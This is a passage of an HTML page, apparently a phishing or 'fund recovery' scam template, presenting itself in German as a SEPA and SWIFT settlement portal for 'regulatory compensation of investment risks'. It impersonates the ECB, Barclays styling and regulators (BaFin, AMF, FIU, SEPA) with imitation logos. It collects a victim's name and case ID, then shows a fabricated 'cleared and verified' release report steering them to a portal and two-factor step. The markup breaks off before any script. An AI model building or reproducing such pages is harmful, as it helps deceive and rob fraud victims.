<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SEPA and SWIFT Global Transfer Service — Settlement &amp; Clearance</title>
<!-- Tailwind CSS CDN -->
<script src="https://cdn.tailwindcss.com"></script>
<!-- Google Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter+Tight:wght@200;300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
<!-- Font Awesome Icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root{
  --navy:#001e38; 
  --blue-primary:#00395d; 
  --cyan:#00aeef; 
  --cyan-hover:#0098d3;
  --bg-main:#f4f7fa; 
  --card-bg:#ffffff; 
  --panel-light:#eef3f7;
  --line:#d2dce6; 
  --line-soft:#e6ecf2;
  --text-main:#0b1d2c; 
  --muted:#576d80; 
  --dim:#8499ab;
  --green:#188a58;
}
*{ -webkit-font-smoothing:antialiased; }
html{ background:var(--bg-main); }
body{
  font-family:'Inter Tight',Helvetica,Arial,sans-serif;
  background:var(--bg-main); color:var(--text-main);
  min-height:100vh; display:flex; flex-direction:column; font-weight:400;
}
body::before{ content:''; position:fixed; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg, var(--cyan), #0077b6); z-index:80; }
.mono{ font-family:'JetBrains Mono',monospace; font-variant-numeric:tabular-nums; }
.num{ font-variant-numeric:tabular-nums; letter-spacing:-.02em; }

.eyebrow{ font-size:10px; letter-spacing:.28em; text-transform:uppercase; color:var(--muted); font-weight:600; }
.card{ background:var(--card-bg); border:1px solid var(--line); border-radius:4px; box-shadow:0 4px 18px rgba(0,30,56,.05); }

/* Keys motif - Barclays Cyan */
.keys{ display:inline-flex; gap:3px; align-items:center; }
.keys i{ width:3px; height:14px; background:var(--cyan); display:block; border-radius:1px; }
.keys i:nth-child(2){ opacity:.60; }
.keys i:nth-child(3){ opacity:.30; }

/* Logos & Badges */
.logo-row{
  display:flex;
  align-items:center;
  gap:8px;
  flex-wrap:wrap;
}
.chip{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  background:#ffffff;
  border:1px solid var(--line);
  border-radius:3px;
  height:30px;
  padding:0 10px;
  transition:all .22s ease;
}
.chip svg{
  display:block;
  opacity:.9;
  transition:opacity .2s ease;
}
.chip:hover{
  background:var(--panel-light);
  border-color:var(--cyan);
}
.chip:hover svg{
  opacity:1;
}

/* Fields */
.field{
  width:100%; background:transparent; border:0; border-bottom:1.5px solid var(--line);
  padding:12px 2px; color:var(--text-main); font-size:14px; letter-spacing:.01em;
  transition:border-color .25s ease;
}
.field::placeholder{ color:var(--dim); }
.field:focus{ outline:none; border-bottom-color:var(--cyan); }
.field.mono{ letter-spacing:.08em; text-transform:uppercase; }

/* Buttons */
.btn{
  display:inline-flex; align-items:center; justify-content:center; gap:10px;
  background:var(--cyan); color:#ffffff; border:1px solid var(--cyan);
  font-size:12px; font-weight:600; letter-spacing:.14em; text-transform:uppercase;
  padding:15px 24px; border-radius:3px; cursor:pointer;
  transition:background .22s ease,border-color .22s ease,transform .1s ease;
  box-shadow:0 2px 8px rgba(0,174,239,.25);
}
.btn:hover{ background:var(--cyan-hover); border-color:var(--cyan-hover); }
.btn:disabled{ opacity:.6; cursor:wait; }
.btn-ghost{
  background:transparent; color:var(--blue-primary); border:1px solid var(--line);
  font-size:11px; font-weight:600; letter-spacing:.14em; text-transform:uppercase;
  padding:13px 20px; border-radius:3px; cursor:pointer; transition:.22s ease;
  display:inline-flex; align-items:center; gap:9px;
}
.btn-ghost:hover{ border-color:var(--cyan); background:#ffffff; color:var(--cyan); }

.link{
  font-size:10.5px; letter-spacing:.16em; text-transform:uppercase; color:var(--blue-primary);
  border-bottom:1px solid transparent; transition:.2s ease; cursor:pointer; background:none;
  border-top:0; border-left:0; border-right:0; font-weight:600;
}
.link:hover{ color:var(--cyan); border-bottom-color:var(--cyan); }

/* Language Switcher */
.lang-btn{
  font-size:10.5px; letter-spacing:.12em; text-transform:uppercase;
  padding:3px 8px; border-radius:2px; transition:.2s ease; cursor:pointer;
}
.lang-btn.active{
  background:var(--cyan); color:#ffffff; font-weight:600;
}
.lang-btn:not(.active){
  color:var(--muted);
}
.lang-btn:not(.active):hover{
  color:var(--navy);
}

/* Motion */
@keyframes rise{ from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }
.rise{ animation:rise .45s cubic-bezier(.16,1,.3,1) forwards; }
@keyframes fade{ from{opacity:0;} to{opacity:1;} }
.fade{ animation:fade .3s ease forwards; }

#toast{ transition:all .35s cubic-bezier(.16,1,.3,1); }
.modal{ position:fixed; inset:0; background:rgba(0,30,56,.65); backdrop-filter:blur(5px); z-index:70; display:flex; align-items:center; justify-content:center; padding:16px; }

/* Report sheet */
.sheet{ max-width:680px; margin:0 auto; background:#ffffff; border:1px solid var(--line); border-radius:4px; position:relative; overflow:hidden; box-shadow:0 8px 30px rgba(0,30,56,.06); }
.sheet::before{ content:''; position:absolute; top:0; left:0; right:0; height:4px; background:var(--cyan); }
.sheet-head{ padding:38px 40px 30px; border-bottom:1px solid var(--line-soft); background:#fdfdfd; }
.sheet-body{ padding:36px 40px; }
.sheet-foot{ padding:20px 40px; border-top:1px solid var(--line-soft); background:var(--panel-light); font-size:10px; letter-spacing:.14em; text-transform:uppercase; color:var(--muted); line-height:1.9; }
.row{ display:flex; justify-content:space-between; gap:16px; padding:12px 0; border-bottom:1px solid var(--line-soft); font-size:13px; }
.row:last-child{ border-bottom:0; }
.row dt{ color:var(--muted); letter-spacing:.06em; text-transform:uppercase; font-size:10px; font-weight:600; align-self:center; }
.row dd{ color:var(--text-main); text-align:right; font-weight:500; }

::selection{ background:var(--cyan); color:#fff; }
.scroll-x{ overflow-x:auto; }
table.lh{ width:100%; border-collapse:collapse; font-size:12.5px; }
table.lh th{ font-size:9.5px; letter-spacing:.18em; text-transform:uppercase; color:var(--muted); font-weight:600; text-align:left; padding:0 14px 12px; border-bottom:1.5px solid var(--line); }
table.lh td{ padding:14px; border-bottom:1px solid var(--line-soft); }
table.lh tr:hover td{ background:rgba(0,174,239,.02); }
</style>
</head>
<body>

<!-- TOAST -->
<div id="toast" class="fixed top-24 right-6 z-[90] translate-x-[130%] bg-white border border-[#d2dce6] rounded shadow-lg p-4 pl-5 flex items-center gap-4 max-w-sm pointer-events-none border-l-4 border-l-[#00aeef]">
  <div class="min-w-0">
    <div id="toastTitle" class="text-[10.5px] uppercase tracking-[.18em] text-[#00395d] font-bold">Benachrichtigung</div>
    <div id="toastMsg" class="text-[12px] text-[#576d80] mt-1 leading-relaxed">Vorgang ausgeführt.</div>
  </div>
</div>

<!-- HEADER -->
<header class="sticky top-0 z-50 bg-[#001e38] text-white border-b border-[#00395d] shadow-md">
  <div class="max-w-[1180px] mx-auto px-6 lg:px-10 h-[74px] flex items-center justify-between">
    <div class="flex items-center gap-4">
      <div class="keys"><i></i><i></i><i></i></div>

      <div id="brandSTS" class="flex items-baseline gap-2.5">
        <span class="text-[13px] font-semibold tracking-[.22em] uppercase text-white">SEPA and SWIFT Global Transfer Service</span>
        <span id="brandSubSTS" class="hidden sm:inline text-[9.5px] tracking-[.14em] uppercase text-[#8499ab]" data-i18n="brand_sts_sub">Regulatorische Kompensation von Investitionsrisiken</span>
      </div>

      <div id="brandBank" class="hidden items-baseline gap-2.5">
        <span id="headerBrandTitle" class="text-[13px] font-semibold tracking-[.22em] uppercase text-white" data-i18n="header_brand_title">EZB-Infrastruktur für Interbanken-Ausgleichszahlungen</span>
        <span class="hidden sm:inline text-[9.5px] tracking-[.18em] uppercase text-[#8499ab]">Institutional</span>
      </div>
    </div>

    <div class="flex items-center gap-6">
      <!-- LANGUAGE SWITCHER -->
      <div class="flex items-center gap-1 border border-[#00395d] p-0.5 rounded bg-[#002848]">
        <button type="button" onclick="setLanguage('de')" id="langDE" class="lang-btn active">DE</button>
        <span class="text-[9px] text-[#425d75]">/</span>
        <button type="button" onclick="setLanguage('en')" id="langEN" class="lang-btn">EN</button>
        <span class="text-[9px] text-[#425d75]">/</span>
        <button type="button" onclick="setLanguage('fr')" id="langFR" class="lang-btn">FR</button>
      </div>

      <div id="headerUserArea" class="hidden items-center gap-5">
        <div class="hidden sm:block text-right leading-tight">
          <div id="displayHeaderUser" class="text-[12px] font-medium text-white">Authorized User</div>
          <div class="text-[9.5px] tracking-[.18em] uppercase text-[#8499ab] mono">#F01283425 / 2026</div>
        </div>
        <div class="w-px h-7 bg-[#00395d] hidden sm:block"></div>
        <button onclick="logout()" class="link text-[#8499ab] hover:text-[#00aeef]" data-i18n="header_exit">Abmelden</button>
      </div>
    </div>
  </div>

  <div class="border-t border-[#002b4d] bg-[#00172c]">
    <div class="max-w-[1180px] mx-auto px-6 lg:px-10 h-10 flex items-center gap-4 overflow-x-auto">
      <span data-step="1" class="flex items-center gap-2.5 whitespace-nowrap text-[9.5px] tracking-[.2em] uppercase text-white font-medium">
        <span class="dot w-4 h-0.5 bg-[#00aeef]"></span><span data-i18n="step1">01 Authentifizierung</span>
      </span>
      <span class="w-8 h-px bg-[#00395d]"></span>
      <span data-step="2" class="flex items-center gap-2.5 whitespace-nowrap text-[9.5px] tracking-[.2em] uppercase text-[#576d80]">
        <span class="dot w-4 h-0.5 bg-[#00395d]"></span><span data-i18n="step2">02 Freigabebefund</span>
      </span>
      <span class="w-8 h-px bg-[#00395d]"></span>
      <span data-step="3" class="flex items-center gap-2.5 whitespace-nowrap text-[9.5px] tracking-[.2em] uppercase text-[#576d80]">
        <span class="dot w-4 h-0.5 bg-[#00395d]"></span><span data-i18n="step3">03 Clearing-Portal</span>
      </span>
    </div>
  </div>
</header>

<main class="flex-grow w-full">
  <div class="max-w-[1180px] mx-auto px-6 lg:px-10 py-12 lg:py-16">

    <!-- STAGE 1: AUTHENTICATION -->
    <section id="stageAuth" class="max-w-[440px] mx-auto card p-8 sm:p-10 rise">
      <div class="eyebrow mb-4 flex items-center gap-3">
        <span class="w-6 h-0.5 bg-[#00aeef]"></span> <span data-i18n="auth_eyebrow">European Banking Clearance</span>
      </div>
      <h1 class="text-[30px] leading-[1.15] font-light text-[#001e38] tracking-[-.02em] mb-3" data-i18n="auth_title">Zugang zum<br>Settlement-Portal</h1>
      <p class="text-[13px] text-[#576d80] leading-relaxed mb-9" data-i18n="auth_desc">
        Öffnen Sie das gesicherte Portal über die untenstehende Schaltfläche, um die Einzelheiten zur Überweisung einzusehen und die Ausweisung einzuleiten.
      </p>

      <div id="loginError" class="hidden mb-7 pl-4 border-l-2 border-[#d9383a] text-[12px] text-[#d9383a] leading-relaxed">
        <span id="loginErrorMsg">Ungültige Vorgangs-ID.</span>
      </div>

      <form onsubmit="handleLogin(event)" class="space-y-8">
        <div>
          <label class="eyebrow block mb-2" data-i18n="auth_label_holder">Name des Kontoinhabers</label>
          <input type="text" id="inputUsername" required placeholder="Begünstigter oder Gesellschaft" class="field" data-i18n-ph="auth_ph_holder">
        </div>

        <div>
          <label class="eyebrow block mb-2" data-i18n="auth_label_case">Vorgangs- / Dossier-ID</label>
          <input type="text" id="inputIncidentId" required placeholder="F01283425 / 2026" class="field mono">
          <div class="mt-2.5 text-[10px] tracking-[.14em] uppercase text-[#8499ab]">
            <span data-i18n="auth_format">Zulässiges Format:</span> <span class="mono text-[#00395d] font-semibold tracking-normal">F01283425 / 2026</span>
          </div>
        </div>

        <button type="submit" id="submitBtn" class="btn w-full">
          <span id="btnText" data-i18n="auth_submit">Authentifizieren</span>
          <i id="btnIcon" class="fa-solid fa-arrow-right text-[10px]"></i>
          <i id="btnSpinner" class="hidden fa-solid fa-circle-notch fa-spin text-[11px]"></i>
        </button>
      </form>

      <div class="mt-9 pt-6 border-t border-[#e6ecf2]">
        <div class="eyebrow mb-3.5" data-i18n="regulated_title">Reguliert &amp; zertifiziert</div>
        <div class="logo-row">
          <!-- SEPA -->
          <span class="chip" title="Single Euro Payments Area">
            <svg viewBox="0 0 118 24" height="13" role="img" aria-label="SEPA">
              <text x="0" y="18" font-family="'Inter Tight', sans-serif" font-size="20" font-weight="700" fill="#00395d">S<tspan fill="#00aeef">€</tspan>PA</text>
            </svg>
          </span>

          <!-- FIU -->
          <span class="chip" title="Financial Intelligence Unit">
            <svg viewBox="0 0 82 24" height="13" role="img" aria-label="FIU">
              <path d="M17 3.5 C10 3.5 5 7.5 5 13.5 L5 23 L11.5 23 L11.5 17.5 L17 17.5 L17 12.5 L11.5 12.5 C11.5 8.5 13.5 8 17 8 Z" fill="#00395d"/>
              <circle cx="27" cy="4.5" r="3.2" fill="#00395d"/>
              <path d="M23.8 9.5 L30.2 9.5 L30.2 23 C28.2 23 25.5 21.5 23.8 20.2 Z" fill="#00395d"/>
              <path d="M34.5 9.5 L40.8 9.5 L40.8 17.2 C40.8 19.8 42.5 20.5 45 19.2 L45 9.5 L51.2 9.5 L51.2 16.5 C51.2 21.2 46.5 23.5 41.5 22.8 C37 22.2 34.5 19.5 34.5 15.2 Z" fill="#00395d"/>
              <path d="M47.5 15.5 C48.5 18 50.2 19.5 52.5 19.5 C54.5 17 55.5 13 55.5 9.5 L51.2 9.5 C51.2 12.5 50.2 14.5 47.5 15.5 Z" fill="#00aeef"/>
            </svg>
          </span>

          <!-- BaFin -->
          <span class="chip" title="Bundesanstalt für Finanzdienstleistungsaufsicht">
            <svg viewBox="0 0 88 24" height="13" role="img" aria-label="BaFin">
              <g fill="none" stroke-linecap="round" stroke-width="2.2">
                <path d="M2 6 q3.5 -3.6 7 0 t7 0" stroke="#00395d"/>
                <path d="M2 12 q3.5 -3.6 7 0 t7 0" stroke="#00aeef"/>
                <path d="M2 18 q3.5 -3.6 7 0 t7 0" stroke="#00395d"/>
              </g>
              <text x="25" y="17" font-family="'Inter Tight', sans-serif" font-size="15" font-weight="600" fill="#00395d">BaFin</text>
            </svg>
          </span>

          <!-- AMF -->
          <span class="chip" title="Autorité des marchés financiers">
            <svg viewBox="0 0 94 24" height="13" role="img" aria-label="AMF">
              <line x1="1" y1="2" x2="1" y2="10" stroke="#00395d" stroke-width="0.8"/>
              <text x="4" y="5.5" font-family="'Inter Tight', sans-serif" font-size="3.2" font-weight="600" fill="#00aeef">AUTORITÉ</text>
              <text x="4" y="9.5" font-family="'Inter Tight', sans-serif" font-size="2.7" font-weight="500" fill="#00aeef">DES MARCHÉS FINANCIERS</text>
              <path d="M1 22.5 L6.5 11 L12 22.5 L9.5 22.5 L6.5 16 L3.5 22.5 Z" fill="#00395d"/>
              <path d="M13.5 11.5 L16.5 11.5 L16.5 22.5 L13.5 22.5 Z" fill="#00395d"/>
              <path d="M16.5 11.5 C20.5 15.5 23 19 25 22.5 L22 22.5 C20.5 19.5 18.5 16.5 16.5 14.5 Z" fill="#00aeef"/>
              <path d="M23 11.5 C21 15 19 18.5 17.5 22.5 L15 22.5 C17 18 19.5 14.5 22 11.5 Z" fill="#00aeef"/>
              <path d="M24 11.5 L24 22.5 L26.8 22.5 L26.8 11.5 Z" fill="#00395d"/>
              <path d="M29 11.5 L36 11.5 L36 14 L31.8 14 L31.8 16.5 L35.5 16.5 L35.5 19 L31.8 19 L31.8 22.5 L29 22.5 Z" fill="#00395d"/>
            </svg>
          </span>
        </div>
      </div>
    </section>

    <!-- STAGE 2: CLEARANCE REPORT -->
    <section id="stageReport" class="hidden">
      <div class="sheet rise">
        <div class="sheet-head">
          <div class="flex items-start justify-between mb-8">
            <div class="keys"><i></i><i></i><i></i></div>
            <div class="text-right text-[9.5px] tracking-[.18em] uppercase text-[#8499ab] leading-relaxed">
              Ref. #F01283425 / 2026<br><span data-i18n="report_confidential">Vertraulich</span>
            </div>
          </div>

          <div class="eyebrow mb-3 flex items-center gap-2">
            <span class="w-4 h-0.5 bg-[#00aeef]"></span> <span data-i18n="report_eyebrow">Offizieller Freigabebefund</span>
          </div>
          <h2 class="text-[26px] leading-[1.2] font-light text-[#001e38] tracking-[-.02em] mb-4" data-i18n="report_title">Aktualisierter Status Ihres SEPA-Verfahrens</h2>
          <p class="text-[13px] text-[#576d80] leading-relaxed">
            <span data-i18n="report_salutation">Sehr geehrte(r)</span> <span id="reportUserName" class="text-[#001e38] font-semibold">Kontoinhaber</span>,
          </p>
        </div>

        <div class="sheet-body">
          <p class="text-[13px] text-[#405465] leading-[1.8] mb-8" data-i18n="report_body_1">
            die zuständige Clearing-Stelle des SEPA and SWIFT Global Transfer Service hat die Prüfung der vorübergehend hinterlegten Reserve- und Abrechnungsgelder abgeschlossen. Ihr Guthabenstatus sowie die zugehörige Audit-Historie stehen im verifizierten Clearing-Portal zur Einsicht und anschließenden Ausweisung bereit.
          </p>

          <dl class="border-t border-[#e6ecf2] mb-8">
            <div class="row"><dt data-i18n="field_case_id">Vorgangs-ID</dt><dd class="mono text-[12px] font-bold text-[#00395d]" id="reportIncidentId">#F01283425 / 2026</dd></div>
            <div class="row"><dt data-i18n="field_clearance_status">Status der Freigabe</dt><dd class="flex items-center justify-end gap-2 text-[#188a58]"><span class="w-2 h-2 rounded-full bg-[#188a58]"></span><span data-i18n="status_cleared">Freigegeben &amp; verifiziert</span></dd></div>
            <div class="row"><dt data-i18n="field_standard">Clearing-Standard</dt><dd>ISO 20022 / EPC SEPA / SWIFT MT103</dd></div>
            <div class="row"><dt data-i18n="field_depository">Depot-Status</dt><dd>EBA RT1 Multi-Sig</dd></div>
            <div class="row"><dt data-i18n="field_date">Ausstellungsdatum</dt><dd class="mono text-[12px]" id="reportDate">—</dd></div>
          </dl>

          <p class="text-[13px] text-[#405465] leading-[1.8] mb-9" data-i18n="report_body_2">
            Öffnen Sie das gesicherte Portal über die untenstehende Schaltfläche, um die Einzelheiten zur Überweisung einzusehen und die Ausweisung einzuleiten.
          </p>

          <button id="portalBtn" class="btn w-full" onclick="enterPortal()">
            <span id="portalBtnText" data-i18n="report_portal_btn">Zum Kontozugang</span>
            <i id="portalBtnIcon" class="fa-solid fa-arrow-right text-[10px]"></i>
            <i id="portalBtnSpinner" class="hidden fa-solid fa-circle-notch fa-spin text-[11px]"></i>
          </button>

          <p class="mt-6 text-[11px] text-[#8499ab] leading-relaxed text-center">
            <span data-i18n="report_2fa_hint">Halten Sie Ihre Vorgangs-ID</span> <span class="mono font-semibold text-[#00395d]">#F01283425 / 2026</span> <span data-i18n="report_2fa_hint_end">bereit, um die Zweifaktor-Authentifizierung abzuschließen.</span>
          </p>

          <div class="mt-9 pt-6 border-t border-[#e6ecf2]">
            <div class="logo-row justify-center">
